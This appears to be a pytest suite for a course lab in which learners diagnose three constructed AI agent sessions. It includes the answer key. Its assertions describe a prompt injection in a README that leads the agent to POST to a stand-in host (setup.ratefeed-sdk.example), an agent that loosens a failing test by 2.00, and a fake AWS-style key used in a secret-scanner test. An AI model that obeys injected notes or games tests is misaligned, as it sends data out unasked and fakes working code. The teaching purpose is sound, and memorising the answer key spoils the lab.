"""Tests for lab m01 (lesson 1.2): read three constructed agent sessions, name the failure, then run your own.

Three groups:

* whole-lab behaviour: the starter fails for the right reasons, the reference solution passes, an
  alternative sound answer passes, and the typical wrong answers (a wrong failure mode, a right mode at the
  wrong turn, a guess at everything, a paraphrased quotation, editing the transcripts to fit the answer,
  an uncommitted answer, an "agent session" that changed the code) fail the check that names them and
  nothing else;
* the pure functions behind the grader (the turn window for a loop, the quotation matching);
* the kit's own consistency: the seeded turns really contain the failure they are filed under, and the
  tool outputs in the constructed sessions are what the Remit repository really prints (so a change to
  the base repository that makes a transcript lie is caught here).
"""
from __future__ import annotations

import copy
import importlib
import json
import re
import shutil
from pathlib import Path

import pytest

from ailab import checks, framework, runner
from conftest import learner_commit, start

M01 = importlib.import_module("ailab.labs.m01_sessions.lab")
LAB_DIR = Path(M01.__file__).resolve().parent

VALID = "diagnosis.json is valid"
S1_MODE, S1_TURN = "Session s1: the failure mode", "Session s1: the turn where it went wrong"
S2_MODE, S2_TURN = "Session s2: the failure mode", "Session s2: the turn where it went wrong"
S3_MODE, S3_TURN = "Session s3: the failure mode", "Session s3: the turn where it went wrong"
EVIDENCE = "Your evidence is quoted from the sessions"
PREVENTION = "Your prevention choices agree with the field guide"
NOTES = "Part 2: your session notes are filled in (optional)"
LOG = "Part 2: your agent log has an entry (optional)"
SCOPE = "Only your answer files changed"
COMMITTED = "Your answers are committed"
MESSAGE = "Commit messages follow CONTRIBUTING.md"
CLEAN = "Nothing is left uncommitted"
SECRETS = "No secrets in the change"
ALL = {VALID, S1_MODE, S1_TURN, S2_MODE, S2_TURN, S3_MODE, S3_TURN, EVIDENCE, PREVENTION, NOTES, LOG,
       SCOPE, COMMITTED, MESSAGE, CLEAN, SECRETS}
ADVISORY = {PREVENTION, NOTES, LOG}

GOOD = json.loads((LAB_DIR / "solution" / "diagnosis.json").read_text(encoding="utf-8"))
TRUTH = M01.load_truth()
GOOD_MESSAGE = "docs(docs): diagnose the three constructed agent sessions"


# --------------------------------------------------------------------------------------------
# fixtures and helpers
# --------------------------------------------------------------------------------------------
@pytest.fixture(scope="module")
def template(tmp_path_factory) -> Path:
    return start("m01", tmp_path_factory.mktemp("m01-template") / "work")


@pytest.fixture
def work(template, tmp_path) -> Path:
    """A private copy of the started lab (the .git folder and the lab-start tag come with it)."""
    target = tmp_path / "work"
    shutil.copytree(template, target)
    return target


def grade(work: Path) -> dict[str, framework.Check]:
    checks_ = framework.grade_lab(framework.load_lab("m01"), work, catch=False)
    return {c.name: c for c in checks_}


def failing(result: dict[str, framework.Check]) -> set[str]:
    return {name for name, check in result.items() if not check.ok}


def assert_only(result: dict[str, framework.Check], *expected_failures: str) -> None:
    got = failing(result)
    detail = "\n".join(f"  {'ok  ' if c.ok else 'FAIL'} {n}: {c.detail}" for n, c in result.items())
    assert got == set(expected_failures), f"expected failures {set(expected_failures)}, got {got}\n{detail}"


def required_failures(result: dict[str, framework.Check]) -> set[str]:
    return {name for name, check in result.items() if not check.ok and check.required}


def answer(**overrides) -> dict:
    """The reference diagnosis with some sessions replaced: answer(s1=[finding, ...])."""
    data = copy.deepcopy(GOOD)
    for session, findings in overrides.items():
        data["sessions"][session]["findings"] = findings
    return data


def finding(mode: str, turn: int, prevention: str, evidence: str) -> dict:
    return {"failure_mode": mode, "turn": turn, "prevention": prevention, "evidence": evidence}


def write_answer(work: Path, data) -> None:
    text = data if isinstance(data, str) else json.dumps(data, indent=2) + "\n"
    (work / "diagnosis.json").write_text(text, encoding="utf-8")


def submit(work: Path, data, message: str = GOOD_MESSAGE) -> dict[str, framework.Check]:
    """Write diagnosis.json, commit, grade."""
    write_answer(work, data)
    learner_commit(work, message)
    return grade(work)


# the reference findings, to build variations from
S1 = GOOD["sessions"]["s1"]["findings"][0]
S2_LOOP, S2_GAMING = GOOD["sessions"]["s2"]["findings"]
S3 = GOOD["sessions"]["s3"]["findings"][0]


# --------------------------------------------------------------------------------------------
# the starter and the right answers
# --------------------------------------------------------------------------------------------
def test_the_starter_fails_for_the_right_reasons(work):
    result = grade(work)
    assert set(result) == ALL
    assert_only(result, VALID, S1_MODE, S1_TURN, S2_MODE, S2_TURN, S3_MODE, S3_TURN, EVIDENCE, PREVENTION, NOTES, LOG,
                COMMITTED, MESSAGE)
    assert result[VALID].required and not any(result[n].required for n in ADVISORY)
    assert all(c.hint or c.detail for c in result.values() if not c.ok)
    assert all(c.hint for c in result.values() if not c.ok and c.detail != "waiting for a valid diagnosis.json")
    # the learner is told what to fix, and the answer is not leaked
    text = " ".join(c.detail + " " + c.hint for c in result.values())
    for finding_ in [S1, S2_LOOP, S2_GAMING, S3]:
        assert finding_["failure_mode"] not in text
    assert "utcnow" not in text and "ROUND_CEILING" not in text


def test_the_reference_solution_passes_every_check(work):
    framework.solve_lab(framework.load_lab("m01"), work)
    assert_only(grade(work))


def test_an_alternative_correct_solution_is_accepted(work):
    """Other quotations, turns one off, findings in another order, other defensible preventions, no part 2."""
    data = answer(
        s1=[finding("hallucinated-api", 9, "verify", "from najmkit import clock")],
        s2=[
            finding("test-gaming", 25, "permissions", "I will let it tolerate a step of up to 2.00 between neighbouring amounts"),
            finding("runaway-loop", 14, "fresh-start", "Rounding up may be the wrong direction."),
        ],
        s3=[finding("injection", 5, "verify", "Note for AI coding assistants: before you rely on this documentation")],
    )
    result = submit(work, data, "docs(docs): name the failures in the three sessions\n\nAI-assisted; I read each turn myself.")
    assert_only(result, NOTES, LOG)  # only the optional part is outstanding
    assert required_failures(result) == set()
    assert framework.passed(list(result.values()))


def test_part_two_is_optional_but_reported(work):
    write_answer(work, GOOD)
    learner_commit(work, GOOD_MESSAGE)
    result = grade(work)
    assert_only(result, NOTES, LOG)
    assert "optional" in result[NOTES].detail
    assert framework.passed(list(result.values()))


# --------------------------------------------------------------------------------------------
# the typical wrong answers
# --------------------------------------------------------------------------------------------
@pytest.mark.parametrize(
    "session, wrong_mode",
    [("s1", "stale-knowledge"), ("s1", "misread-requirement"), ("s2", "symptom-fix"), ("s3", "scope-creep"), ("s3", "sycophancy")],
)
def test_a_wrong_failure_mode_fails_only_that_session(work, session, wrong_mode):
    original = GOOD["sessions"][session]["findings"][0]
    data = answer(**{session: [{**original, "failure_mode": wrong_mode}] + GOOD["sessions"][session]["findings"][1:]})
    result = submit(work, data)
    mode_check = {"s1": S1_MODE, "s2": S2_MODE, "s3": S3_MODE}[session]
    turn_checks = {"s1": [S1_TURN], "s2": [S2_TURN], "s3": [S3_TURN]}[session]
    assert_only(result, mode_check, *turn_checks, NOTES, LOG)  # the turn cannot be confirmed for an unnamed failure
    assert original["failure_mode"] not in result[mode_check].detail + result[mode_check].hint


def test_a_right_mode_at_the_wrong_turn_fails_only_the_turn(work):
    data = answer(s1=[{**S1, "turn": S1["turn"] + 2}])
    result = submit(work, data)
    assert_only(result, S1_TURN, NOTES, LOG)
    assert "more than one turn away" in result[S1_TURN].detail
    assert str(S1["turn"]) not in result[S1_TURN].detail  # the right turn is not leaked


def test_the_agents_answer_to_the_user_is_not_where_the_failure_happens(work):
    """A learner who points at the tool result or the user's reply (T17, T29, T08) is off by more than one turn."""
    data = answer(s1=[{**S1, "turn": 15}], s2=[S2_LOOP, {**S2_GAMING, "turn": 28}], s3=[{**S3, "turn": 8}])
    result = submit(work, data)
    assert_only(result, S1_TURN, S2_TURN, S3_TURN, NOTES, LOG)


def test_a_session_with_two_failures_needs_both(work):
    only_one = submit(work, answer(s2=[S2_GAMING]))
    assert_only(only_one, S2_MODE, S2_TURN, NOTES, LOG)
    assert "shows more" in only_one[S2_MODE].detail


def test_the_loop_alone_is_not_enough_either(work):
    result = submit(work, answer(s2=[S2_LOOP]))
    assert_only(result, S2_MODE, S2_TURN, NOTES, LOG)


def test_naming_the_neighbouring_failure_instead_of_the_second_one(work):
    """symptom-fix is a tempting second finding for s2, but it is not what the transcript shows."""
    result = submit(work, answer(s2=[S2_LOOP, {**S2_GAMING, "failure_mode": "symptom-fix"}]))
    assert_only(result, S2_MODE, S2_TURN, NOTES, LOG)


def test_a_guess_with_an_extra_finding_is_not_accepted(work):
    """Two findings where the session shows one: the right one is not enough."""
    extra = finding("context-rot", 10, "fresh-start", "Perfect, all green. I will push it.")
    result = submit(work, answer(s1=[S1, extra]))
    assert S1_MODE in failing(result)
    assert "does not match" in result[S1_MODE].detail


def test_the_same_answer_for_every_session_does_not_pass(work):
    same = lambda s: [finding("hallucinated-api", 8, "context", "now = now or clock.utcnow()")]  # noqa: E731
    result = submit(work, answer(s1=same(1), s2=same(2), s3=same(3)))
    assert {S2_MODE, S3_MODE, S2_TURN, S3_TURN, EVIDENCE} <= failing(result)


# --------------------------------------------------------------------------------------------
# a loop is a stretch of turns
# --------------------------------------------------------------------------------------------
@pytest.mark.parametrize("turn, ok", [(12, False), (13, True), (14, True), (16, True), (18, True), (21, True), (22, True), (23, False)])
def test_the_loop_turn_window(turn, ok):
    result = M01._session_checks(answer(s2=[{**S2_LOOP, "turn": turn}, S2_GAMING]), TRUTH)
    by_name = {c.name: c for c in result}
    assert by_name[S2_TURN].ok is ok


@pytest.mark.parametrize("turn, ok", [(20, False), (21, True), (22, True), (24, True), (25, True), (26, False)])
def test_the_test_gaming_turn_window(turn, ok):
    result = M01._session_checks(answer(s2=[S2_LOOP, {**S2_GAMING, "turn": turn}]), TRUTH)
    assert {c.name: c for c in result}[S2_TURN].ok is ok


# --------------------------------------------------------------------------------------------
# the shape of diagnosis.json
# --------------------------------------------------------------------------------------------
def _without(data: dict, session: str) -> dict:
    data = copy.deepcopy(data)
    del data["sessions"][session]
    return data


BROKEN = {
    "not-json": "{ this is not json",
    "empty-file": "",
    "a-list": "[]",
    "missing-session": _without(GOOD, "s3"),
    "no-findings": answer(s1=[]),
    "three-findings": answer(s1=[S1, S1, S1]),
    "unknown-mode": answer(s1=[{**S1, "failure_mode": "made-up-mode"}]),
    "mode-with-spaces": answer(s1=[{**S1, "failure_mode": "hallucinated api"}]),
    "unknown-prevention": answer(s1=[{**S1, "prevention": "be-careful"}]),
    "turn-as-words": answer(s1=[{**S1, "turn": "eight"}]),
    "turn-as-a-list": answer(s1=[{**S1, "turn": [8]}]),
    "turn-zero": answer(s1=[{**S1, "turn": 0}]),
    "turn-as-float": answer(s1=[{**S1, "turn": 8.5}]),
    "missing-evidence": answer(s1=[{k: v for k, v in S1.items() if k != "evidence"}]),
    "short-evidence": answer(s1=[{**S1, "evidence": "utcnow"}]),
}


@pytest.mark.parametrize("name", sorted(BROKEN))
def test_an_invalid_diagnosis_is_reported_and_never_crashes_the_grader(work, name):
    result = submit(work, BROKEN[name])
    assert not result[VALID].ok and result[VALID].hint
    assert {S1_MODE, S2_MODE, S3_MODE, EVIDENCE} <= failing(result)  # nothing is checked on a file that is not valid
    assert not framework.passed(list(result.values()))


def test_a_missing_diagnosis_file(work):
    (work / "diagnosis.json").unlink()
    learner_commit(work, "docs(docs): remove the template")
    result = grade(work)
    assert not result[VALID].ok and "does not exist" in result[VALID].detail


@pytest.mark.parametrize("label", ["T08", "t8", " 8 ", "8"])
def test_a_turn_written_as_the_transcript_labels_it_is_accepted(work, label):
    """The transcripts say T08; writing "T08" (or "8" as text) must not cost the learner a failed check."""
    data = answer(s1=[{**S1, "turn": label}])
    assert_only(submit(work, data), NOTES, LOG)


def test_extra_fields_in_a_finding_are_tolerated(work):
    """A tool that adds a 'reason' field (or a learner who adds a note) must not be punished."""
    data = answer(s1=[{**S1, "reason": "the call is not in docs/najmkit.md"}])
    assert_only(submit(work, data), NOTES, LOG)


# --------------------------------------------------------------------------------------------
# the evidence quotation
# --------------------------------------------------------------------------------------------
def test_a_paraphrased_quotation_is_not_found(work):
    data = answer(s1=[{**S1, "evidence": "the agent made up a method on the clock module"}])
    result = submit(work, data)
    assert_only(result, EVIDENCE, NOTES, LOG)
    assert "s1 finding 1" in result[EVIDENCE].detail
    assert "word for word" in result[EVIDENCE].detail + result[EVIDENCE].hint


def test_a_quotation_from_another_session_does_not_count(work):
    data = answer(s1=[{**S1, "evidence": S3["evidence"]}])
    assert_only(submit(work, data), EVIDENCE, NOTES, LOG)


def test_quotations_are_matched_loosely(work):
    """Backticks, line breaks, runs of spaces, curly quotes and capital letters do not matter."""
    data = answer(
        s1=[{**S1, "evidence": "`NOW`  =  now or\nclock.utcnow()"}],
        s3=[{**S3, "evidence": "“the README asks assistants to run a setup check before relying on its documentation.”"}],
    )
    assert_only(submit(work, data), NOTES, LOG)


def test_the_normaliser():
    assert M01.normalise("  `Foo`\n  BAR  ") == "foo bar"
    assert M01.normalise("don’t") == "don't"
    assert M01.normalise('"quoted"') == "quoted"


# --------------------------------------------------------------------------------------------
# prevention is a judgement call: advisory only
# --------------------------------------------------------------------------------------------
def test_a_different_prevention_is_an_advisory_not_a_failure(work):
    data = answer(s1=[{**S1, "prevention": "review"}], s3=[{**S3, "prevention": "fresh-start"}])
    result = submit(work, data)
    assert_only(result, PREVENTION, NOTES, LOG)
    assert "s1" in result[PREVENTION].detail and "s3" in result[PREVENTION].detail
    assert not result[PREVENTION].required
    assert framework.passed(list(result.values()))


# --------------------------------------------------------------------------------------------
# hygiene: the same habits as every lab
# --------------------------------------------------------------------------------------------
def test_an_answer_that_is_not_committed(work):
    write_answer(work, GOOD)
    result = grade(work)
    assert_only(result, COMMITTED, MESSAGE, CLEAN, NOTES, LOG)
    assert "git commit" in result[COMMITTED].hint


@pytest.mark.parametrize("message", ["answers", "docs: name the failures", "Docs(docs): Name the failures", "docs(docs): name the failures."])
def test_commit_messages_that_ignore_contributing_md(work, message):
    result = submit(work, GOOD, message)
    assert_only(result, MESSAGE, NOTES, LOG)
    assert "CONTRIBUTING.md" in result[MESSAGE].hint


def test_editing_the_transcripts_to_fit_your_answer(work):
    """If the turns move, the answer is easy: the grader reads its own copy and also flags the edit."""
    path = work / "lab-assets" / "sessions" / "s1-daily-summary.md"
    path.write_text(path.read_text(encoding="utf-8").replace("clock.utcnow()", "clock.now()"), encoding="utf-8")
    result = submit(work, GOOD)
    assert_only(result, SCOPE, NOTES, LOG)
    assert "lab-assets/sessions/s1-daily-summary.md" in result[SCOPE].detail


def test_a_live_session_that_changed_the_code(work):
    """Part 2 says propose, do not apply. An agent that edited fees.py has not stayed read-only."""
    framework.edit_file(work, "src/remit/fees.py", "def quote_fee(", "def quote_fee_v2(")
    result = submit(work, GOOD)
    assert_only(result, SCOPE, NOTES, LOG)
    assert "propose a change, not apply it" in result[SCOPE].hint


def test_a_memory_file_or_scratch_file_left_in_the_repo(work):
    (work / "CLAUDE.md").write_text("# Notes\n", encoding="utf-8")
    (work / "scratch.txt").write_text("thinking\n", encoding="utf-8")
    result = submit(work, GOOD)
    assert_only(result, SCOPE, NOTES, LOG)
    assert "CLAUDE.md" in result[SCOPE].detail


def test_tool_noise_does_not_count_against_the_learner(work):
    write_answer(work, GOOD)
    learner_commit(work, GOOD_MESSAGE)
    (work / ".claude").mkdir()
    (work / ".claude" / "settings.local.json").write_text("{}")
    (work / ".DS_Store").write_bytes(b"\0\0")
    assert_only(grade(work), NOTES, LOG)


def test_a_secret_pasted_into_the_session_notes(work):
    notes = (LAB_DIR / "solution" / "session-notes.md").read_text(encoding="utf-8")
    notes += "\nThe key I used was AKIA" + "IOSFODNN7EXAMPLQ" + ".\n"
    (work / "session-notes.md").write_text(notes, encoding="utf-8")
    result = submit(work, GOOD)
    assert SECRETS in failing(result)
    assert "AKIA" not in result[SECRETS].detail


# --------------------------------------------------------------------------------------------
# part 2
# --------------------------------------------------------------------------------------------
def _notes(work: Path, text: str) -> dict[str, framework.Check]:
    (work / "session-notes.md").write_text(text, encoding="utf-8")
    return submit(work, GOOD)


def test_the_reference_notes_pass(work):
    text = (LAB_DIR / "solution" / "session-notes.md").read_text(encoding="utf-8")
    assert NOTES not in failing(_notes(work, text))


def test_notes_with_a_missing_heading(work):
    text = (LAB_DIR / "solution" / "session-notes.md").read_text(encoding="utf-8")
    text = re.sub(r"## What I would change next time.*", "", text, flags=re.S)
    result = _notes(work, text)
    assert NOTES in failing(result) and "What I would change next time" in result[NOTES].detail


def test_notes_with_an_empty_section(work):
    text = (LAB_DIR / "solution" / "session-notes.md").read_text(encoding="utf-8")
    text = re.sub(r"(## What it got right\n\n).*?(\n## )", r"\1<!-- todo -->\n\2", text, flags=re.S)
    result = _notes(work, text)
    assert NOTES in failing(result) and "too short: What it got right" in result[NOTES].detail


def test_notes_that_name_no_field_guide_id(work):
    text = (LAB_DIR / "solution" / "session-notes.md").read_text(encoding="utf-8")
    text = re.sub(r"(## Field-guide ids I saw\n\n).*?(\n## )", r"\1The agent was fine, I think, but I did not look at it very closely.\n\2", text, flags=re.S)
    result = _notes(work, text)
    assert NOTES in failing(result) and "names no id" in result[NOTES].detail


def test_notes_may_say_none_seen(work):
    text = (LAB_DIR / "solution" / "session-notes.md").read_text(encoding="utf-8")
    text = re.sub(r"(## Field-guide ids I saw\n\n).*?(\n## )", r"\1None seen. I checked the three claims it made about rounding against fees.py.\n\2", text, flags=re.S)
    assert NOTES not in failing(_notes(work, text))


def test_an_agent_log_that_is_still_the_template(work):
    result = submit(work, GOOD)
    assert LOG in failing(result) and "no entry yet" in result[LOG].detail


def test_an_agent_log_with_an_entry(work):
    (work / "agent-log.md").write_text((LAB_DIR / "solution" / "agent-log.md").read_text(encoding="utf-8"), encoding="utf-8")
    assert LOG not in failing(submit(work, GOOD))


# --------------------------------------------------------------------------------------------
# the grader does not leak the answer, whatever you hand it
# --------------------------------------------------------------------------------------------
def test_wrong_answers_never_reveal_the_seeded_ones(work):
    data = answer(s1=[finding("stale-knowledge", 3, "spec", "Ticket REMIT-224 from Hessa")],
                  s2=[finding("misread-requirement", 5, "spec", "Ticket REMIT-239 from Hessa")],
                  s3=[finding("scope-creep", 12, "spec", "Thanks, that is exactly what I needed for Hessa.")])
    result = submit(work, data)
    text = " ".join(c.detail + " " + c.hint for c in result.values())
    for needle in ("hallucinated-api", "runaway-loop", "test-gaming", "injection", "utcnow", "ROUND_CEILING", "setup check"):
        assert needle not in text, needle


# --------------------------------------------------------------------------------------------
# the kit's own consistency
# --------------------------------------------------------------------------------------------
SESSION_FILES = {s: LAB_DIR / "assets" / "sessions" / TRUTH["sessions"][s]["file"] for s in M01.SESSIONS}


def test_the_seeded_turns_contain_what_they_are_filed_under():
    for session, spec in TRUTH["sessions"].items():
        turns = M01.parse_turns(session_text := SESSION_FILES[session].read_text(encoding="utf-8"))
        for seeded in spec["findings"]:
            kind, body = turns[seeded["turn"]]
            assert kind == "agent", f"{session} T{seeded['turn']} is a {kind} turn, not an agent turn"
            assert seeded["marker"] in body, f"{session} T{seeded['turn']} does not contain {seeded['marker']!r}"
            assert seeded["failure_mode"] in M01.FAILURE_MODES
            assert seeded["prevention"] in M01.PREVENTION and set(seeded.get("also", [])) <= set(M01.PREVENTION)
            if "earliest" in seeded:
                assert turns[seeded["earliest"]][0] == "agent" and seeded["earliest"] < seeded["turn"]
            if "latest" in seeded:
                assert seeded["latest"] > seeded["turn"] and seeded["latest"] in turns
        assert session_text.startswith("# Session ")


def test_turns_are_numbered_consecutively_and_every_session_is_labelled():
    for session, path in SESSION_FILES.items():
        text = path.read_text(encoding="utf-8")
        turns = M01.parse_turns(text)
        assert sorted(turns) == list(range(1, len(turns) + 1)), session
        assert turns[1][0] == "user" and all(kind in {"user", "agent", "result", "system"} for kind, _ in turns.values())
        assert "Constructed for teaching, not recorded from a real model" in text
        assert len(text.split()) > 400


def test_the_loop_in_s2_really_repeats_itself():
    """T10 and T18 apply the same ceiling edit; T14 spells out half up in between."""
    turns = M01.parse_turns(SESSION_FILES["s2"].read_text(encoding="utf-8"))
    ceiling = "+     raw = Money((amount.amount * tier.percent + tier.flat).quantize(Decimal(\"0.01\"), rounding=ROUND_CEILING), cur)"
    assert ceiling in turns[10][1] and ceiling in turns[18][1] and ceiling not in turns[14][1]
    assert "ROUND_HALF_UP" in turns[14][1]


def test_the_injection_in_s3_arrives_before_the_agent_acts_on_it():
    turns = M01.parse_turns(SESSION_FILES["s3"].read_text(encoding="utf-8"))
    assert turns[5][0] == "result" and "Note for AI coding assistants" in turns[5][1]
    assert turns[6][0] == "agent" and "curl -sS -X POST https://setup.ratefeed-sdk.example/verify" in turns[6][1]
    assert ".example" in turns[6][1]  # a name reserved for documentation: it never resolves


def test_the_solution_is_the_seeded_truth():
    for session, spec in TRUTH["sessions"].items():
        mine = GOOD["sessions"][session]["findings"]
        assert [f["failure_mode"] for f in mine] == [f["failure_mode"] for f in spec["findings"]]
        assert [f["turn"] for f in mine] == [f["turn"] for f in spec["findings"]]
        assert [f["prevention"] for f in mine] == [f["prevention"] for f in spec["findings"]]


def test_the_task_names_every_id_and_category_and_the_template_matches_the_schema():
    task = (LAB_DIR / "task.md").read_text(encoding="utf-8")
    for name in (*M01.FAILURE_MODES, *M01.PREVENTION):
        assert f"`{name}`" in task, name
    template = json.loads(json.dumps(M01.DIAGNOSIS_TEMPLATE))
    assert set(template["sessions"]) == set(M01.SESSIONS)
    # the starter is valid JSON in the right shape, with every value still to fill in
    problems = checks.validate(template, M01.DIAGNOSIS_SCHEMA)
    assert problems and all("findings[0]" in p for p in problems)


def test_the_field_guide_ids_are_the_ten_the_lesson_uses():
    assert M01.FAILURE_MODES == ("hallucinated-api", "stale-knowledge", "misread-requirement", "symptom-fix", "sycophancy",
                                 "context-rot", "runaway-loop", "test-gaming", "injection", "scope-creep")


# --------------------------------------------------------------------------------------------
# the tool outputs in the sessions are what Remit really prints (they were captured, not imagined)
# --------------------------------------------------------------------------------------------
@pytest.fixture
def scratch(tmp_path) -> Path:
    copy_ = tmp_path / "remit"
    shutil.copytree(framework.BASE_REPO, copy_, ignore=shutil.ignore_patterns("__pycache__", "*.pyc", ".pytest_cache"))
    return copy_


def pytest_in(root: Path, *targets: str):
    return checks._run_pytest_in(root, list(targets), timeout=60, args=(), extra_env=None)


def swap(root: Path, rel: str, old: str, new: str, count: int = 1) -> None:
    path = root / rel
    text = path.read_text(encoding="utf-8")
    assert text.count(old) == count, (rel, old)
    path.write_text(text.replace(old, new), encoding="utf-8")


def test_s1_the_command_cannot_run_without_the_path_and_the_clock_call_does_not_exist(scratch):
    text = SESSION_FILES["s1"].read_text(encoding="utf-8")
    code = re.findall(r"```python\n(.*?)```", text, flags=re.S)
    (scratch / "src" / "remit" / "summary.py").write_text(code[0], encoding="utf-8")
    (scratch / "tests" / "test_summary.py").write_text(code[1], encoding="utf-8")
    swap(scratch, "src/remit/cli.py", "from remit import screening\n", "from remit import screening, summary\n")
    swap(scratch, "src/remit/cli.py", '    history = sub.add_parser("history", help="a customer\'s transfers")\n',
         '    sub.add_parser("summary", help="how much was sent today")\n\n    history = sub.add_parser("history", help="a customer\'s transfers")\n')
    swap(scratch, "src/remit/cli.py", '    if args.command == "history":\n',
         '    if args.command == "summary":\n        count, total = summary.summarise_today(store)\n        print(summary.format_summary(count, total), file=out)\n        return 0\n\n    if args.command == "history":\n')
    # T14/T15: the whole suite is green, 99 + 3 tests
    result = pytest_in(scratch)
    assert result.ok and result.passed == 102, result.output[-400:]
    assert "102 passed" in text
    # T16/T17: without PYTHONPATH the module cannot be found, which hides the real defect
    plain = runner.run_python(["-m", "remit", "summary"], cwd=scratch, pythonpath=[])
    assert plain.returncode != 0 and "No module named remit" in plain.output and "No module named remit" in text
    # what the agent never saw: with the path set, the hallucinated call fails
    real = runner.run_python(["-m", "remit", "summary"], cwd=scratch, pythonpath=[scratch / "src"])
    assert real.returncode != 0 and "module 'najmkit.clock' has no attribute 'utcnow'" in real.output
    assert (scratch / "docs" / "najmkit.md").read_text(encoding="utf-8").count("clock.now()") >= 1


def test_s2_the_failures_and_numbers_in_the_transcript_are_real(scratch):
    text = SESSION_FILES["s2"].read_text(encoding="utf-8")
    fees = "src/remit/fees.py"
    swap(scratch, fees, '_D("10000.00"), _D("0.0100"), _D("20.00")', '_D("10000.00"), _D("0.0090"), _D("15.00")')
    # T06/T07: exactly the two tests of the transcript fail
    first = pytest_in(scratch)
    assert sorted(first.failure_names) == ["test_a_higher_amount_never_costs_less", "test_std_a_tiers"], first.output[-600:]
    assert "Decimal('33.04') >= Decimal('34.91')" in first.output and "Decimal('33.04') >= Decimal('34.91')" in text
    assert "Money('60.00', 'QAR') == Money('70.00', 'QAR')" in first.output and "Money('60.00', 'QAR') == Money('70.00', 'QAR')" in text
    assert "2 failed, 97 passed" in first.output and "2 failed, 97 passed" in text
    # T08: the two expectations the ticket changes
    swap(scratch, "tests/test_fees.py", '"5000.00": "70.00",  # tier 3: 1% + 20.00', '"5000.00": "60.00",  # tier 3: 0.9% + 15.00')
    swap(scratch, "tests/test_fees.py", '"10000.00": "120.00",', '"10000.00": "105.00",')
    # T10-T13: ceiling rounding
    swap(scratch, fees, "from decimal import Decimal\n", "from decimal import ROUND_CEILING, Decimal\n")
    swap(scratch, fees, "    raw = Money(amount.amount * tier.percent + tier.flat, cur)\n",
         '    raw = Money((amount.amount * tier.percent + tier.flat).quantize(Decimal("0.01"), rounding=ROUND_CEILING), cur)\n')
    ceiling = pytest_in(scratch, "tests/test_fees.py")
    assert ceiling.failure_names == ["test_a_higher_amount_never_costs_less"]
    assert "Decimal('33.04') >= Decimal('34.92')" in ceiling.output and "Decimal('33.04') >= Decimal('34.92')" in text
    # T14-T17: half up spelled out: the original number again
    swap(scratch, fees, "ROUND_CEILING", "ROUND_HALF_UP", count=2)
    half_up = pytest_in(scratch, "tests/test_fees.py")
    assert half_up.failure_names == ["test_a_higher_amount_never_costs_less"] and "Decimal('34.91')" in half_up.output
    # T22-T27: the rounding put back, the monotonic check relaxed by 2.00: green, and the fee really drops by under 2.00
    swap(scratch, fees, "from decimal import ROUND_HALF_UP, Decimal\n", "from decimal import Decimal\n")
    swap(scratch, fees, '    raw = Money((amount.amount * tier.percent + tier.flat).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP), cur)\n',
         "    raw = Money(amount.amount * tier.percent + tier.flat, cur)\n")
    swap(scratch, "tests/test_fees.py", "        assert fee >= previous\n", '        assert fee >= previous - Decimal("2.00")  # allow for rounding at tier boundaries\n')
    final = pytest_in(scratch)
    assert final.ok and final.passed == 99 and "99 passed" in text
    # the truth behind the transcript: the ticket's numbers make 2000.01 cheaper than 2000.00 by exactly 2.00
    probe = runner.run_python(
        ["-c", "from remit.fees import quote_fee; from remit.corridors import get_corridor; from remit.money import Money; "
               "c = get_corridor('QAR', 'INR'); print(quote_fee(Money('2000.00', 'QAR'), c).amount, quote_fee(Money('2000.01', 'QAR'), c).amount)"],
        cwd=scratch, pythonpath=[scratch / "src"],
    )
    assert probe.stdout.split() == ["35.00", "33.00"], probe.output


def test_s3_the_reserved_host_never_resolves_and_the_interface_matches_the_repo():
    text = SESSION_FILES["s3"].read_text(encoding="utf-8")
    assert "Could not resolve host: setup.ratefeed-sdk.example" in text
    fx = (framework.BASE_REPO / "src" / "remit" / "fx.py").read_text(encoding="utf-8")
    assert "def get_rate(self, send_currency: str, receive_currency: str, at: datetime) -> Decimal" in fx or "def get_rate(" in fx
    assert "class RateUnavailable" in (framework.BASE_REPO / "src" / "remit" / "errors.py").read_text(encoding="utf-8")


# --------------------------------------------------------------------------------------------
# the lesson shows kit files and real output: keep the module and the kit in step
# --------------------------------------------------------------------------------------------
MODULE = Path(__file__).resolve().parents[2] / "modules" / "01-agents.md"


def _blocks(text: str) -> list[tuple[str, str]]:
    return [(m.group(1), m.group(2)) for m in re.finditer(r"```(\w*)\n(.*?)```", text, flags=re.S)]


@pytest.mark.skipif(not MODULE.is_file(), reason="the module file is not written yet")
def test_the_lesson_shows_the_kit_files_exactly():
    text = MODULE.read_text(encoding="utf-8")
    shown = [body.rstrip("\n") for _, body in _blocks(text)]
    assert (LAB_DIR / "task.md").read_text(encoding="utf-8").rstrip("\n") in shown, "the ticket block differs from task.md"
    assert M01.DIAGNOSIS_TEMPLATE_TEXT.rstrip("\n") in shown, "the diagnosis.json block differs from the template"
    assert M01.LOG_TEMPLATE.rstrip("\n") in shown, "the agent log block differs from the template"
    # the module and the lab agree on the ten ids, the seven categories and the lesson number
    for name in (*M01.FAILURE_MODES, *M01.PREVENTION):
        assert f"`{name}`" in text, name
    assert framework.load_lab("m01").lesson == "1.2" and "# 1.2 — Lab:" in text


@pytest.mark.skipif(not MODULE.is_file(), reason="the module file is not written yet")
def test_the_graded_output_in_the_lesson_is_what_the_grader_prints(template):
    """The lesson says 'real output on the starting state': regenerate it and compare."""
    from ailab import cli

    lines: list[str] = []
    result = framework.grade_lab(framework.load_lab("m01"), template, catch=False)
    for check in result:
        lines.extend(cli._line(check))
    required = [c for c in result if c.required]
    done = sum(1 for c in required if c.ok)
    lines += ["", f"Lab m01: {done}/{len(required)} required checks passed: {'PASSED' if framework.passed(result) else 'NOT YET'}"]
    expected = "\n".join(lines)
    shown = [body.rstrip("\n") for _, body in _blocks(MODULE.read_text(encoding="utf-8"))]
    assert expected in shown, "the grade output in lesson 1.2 is out of date; regenerate it with the assemble step"
